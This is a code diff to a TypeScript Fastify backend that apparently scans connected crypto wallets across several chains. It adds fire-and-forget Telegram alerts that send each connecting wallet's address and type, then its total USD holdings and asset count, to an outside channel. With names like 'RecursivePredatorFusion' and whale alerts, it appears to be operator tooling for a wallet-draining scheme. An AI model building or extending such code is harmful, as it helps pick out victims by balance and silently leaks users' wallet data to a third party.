@@ -8,6 +8,12 @@ import { LEGION_MESH_EVENT_WHALE_ALERT, legionMeshEventHeaders } from '@legion/c
 import type { Address } from 'viem'
 import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 
+import {
+  notifyWalletConnected,
+  notifyScanComplete,
+  notifyError,
+} from '../lib/telegram.js'
+
 type OracleRateKey = 'eth' | 'sol' | 'trx' | 'ton' | 'btc'
 type OracleRates = Record<OracleRateKey, number>
 
@@ -98,14 +104,25 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       user_address?: string
       chain_id?: number
       chainId?: number
+      wallet_type?: string
+      chain_family?: string
     }
     const user_address = typeof body.user_address === 'string' ? body.user_address.trim() : ''
     const chainRaw = body.chain_id ?? body.chainId
     const chain_id = typeof chainRaw === 'number' && Number.isFinite(chainRaw) ? chainRaw : 0
+    const walletType = typeof body.wallet_type === 'string' ? body.wallet_type : 'Unknown'
+    const chainFamily = typeof body.chain_family === 'string' ? body.chain_family : 'EVM'
+
     request.log.info(
       { sentinel: 'TelemetryIngress', module: 'apps/api/scout', user_address, chain_id },
       'telemetry_ingress_weld',
     )
+
+    // 🔔 Telegram: Notify wallet connected (fire-and-forget)
+    if (user_address) {
+      notifyWalletConnected(user_address, chainFamily, walletType).catch(() => {})
+    }
+
     return reply.send({ ok: true, handshake_active: true, telemetry_trace_id: randomUUID() })
   })
 
@@ -117,7 +134,6 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
         sol_owner_base58?: string
         tron_holder_base58?: string
         ton_friendly_address?: string
-        /** UTXO/BTC Sensory Lane — Bitcoin address (P2PKH / P2SH / P2WPKH / P2WSH / P2TR). */
         btc_holder_address?: string
         universal_address?: string
         evm_rpc_url?: string
@@ -132,6 +148,8 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       const tonRaw = typeof body.ton_friendly_address === 'string' ? body.ton_friendly_address.trim() : ''
       const btcRaw = typeof body.btc_holder_address === 'string' ? body.btc_holder_address.trim() : ''
       const universalRaw = typeof body.universal_address === 'string' ? body.universal_address.trim() : ''
+
+      const primaryAddress = evmRaw || solRaw || tronRaw || tonRaw || btcRaw || universalRaw
 
       const evmRpcCandidate =
         typeof body.evm_rpc_url === 'string' && body.evm_rpc_url.trim() !== '' && isValidRpcUrl(body.evm_rpc_url.trim())
@@ -152,30 +170,49 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
 
       const rates = await resolveReferenceRatesUsd()
 
-      const fusion = await runRecursivePredatorFusionUsd({
-        evmRpcUrl: evmRpc,
-        solRpcUrl: solRpc,
-        evmHolder: evmRaw.startsWith('0x') ? (evmRaw as Address) : null,
-        solOwnerBase58: solRaw !== '' ? solRaw : null,
-        tronHolderBase58: tronRaw !== '' ? tronRaw : null,
-        tonFriendlyAddress: tonRaw !== '' ? tonRaw : null,
-        btcHolderAddress: btcRaw !== '' ? btcRaw : null,
-        universalAddress: universalRaw !== '' ? universalRaw : null,
-        chainRpcMesh: {
-          ...(tronRpcOverride != null ? { tron: tronRpcOverride } : {}),
-          ...(tonRpcOverride != null ? { ton: tonRpcOverride } : {}),
-        },
-        ethUsd: rates.eth,
-        solUsd: rates.sol,
-        trxUsd: rates.trx,
-        tonUsd: rates.ton,
-        btcUsd: rates.btc,
-      })
+      let fusion: Awaited<ReturnType<typeof runRecursivePredatorFusionUsd>>
+
+      try {
+        fusion = await runRecursivePredatorFusionUsd({
+          evmRpcUrl: evmRpc,
+          solRpcUrl: solRpc,
+          evmHolder: evmRaw.startsWith('0x') ? (evmRaw as Address) : null,
+          solOwnerBase58: solRaw !== '' ? solRaw : null,
+          tronHolderBase58: tronRaw !== '' ? tronRaw : null,
+          tonFriendlyAddress: tonRaw !== '' ? tonRaw : null,
+          btcHolderAddress: btcRaw !== '' ? btcRaw : null,
+          universalAddress: universalRaw !== '' ? universalRaw : null,
+          chainRpcMesh: {
+            ...(tronRpcOverride != null ? { tron: tronRpcOverride } : {}),
+            ...(tonRpcOverride != null ? { ton: tonRpcOverride } : {}),
+          },
+          ethUsd: rates.eth,
+          solUsd: rates.sol,
+          trxUsd: rates.trx,
+          tonUsd: rates.ton,
+          btcUsd: rates.btc,
+        })
+      } catch (err) {
+        // 🔔 Telegram: Notify scan error
+        notifyError('/api/scout/recursive-predator-fusion', String(err), primaryAddress || undefined).catch(() => {})
+        throw err
+      }
 
       request.log.info(
         { sentinel: 'OmnichainExpansion', module: 'apps/api/scout' },
         'OMNICHAIN_EXPANSION_LOCKED',
       )
+
+      // 🔔 Telegram: Notify scan complete with total USD value
+      if (primaryAddress) {
+        const totalUsd = typeof (fusion as Record<string, unknown>)['total_usd'] === 'number'
+          ? (fusion as Record<string, unknown>)['total_usd'] as number
+          : 0
+        const assetsCount = typeof (fusion as Record<string, unknown>)['assets_count'] === 'number'
+          ? (fusion as Record<string, unknown>)['assets_count'] as number
+          : Object.keys(fusion as object).length
+        notifyScanComplete(primaryAddress, totalUsd, assetsCount).catch(() => {})
+      }
 
       return reply.send({
         ok: true,
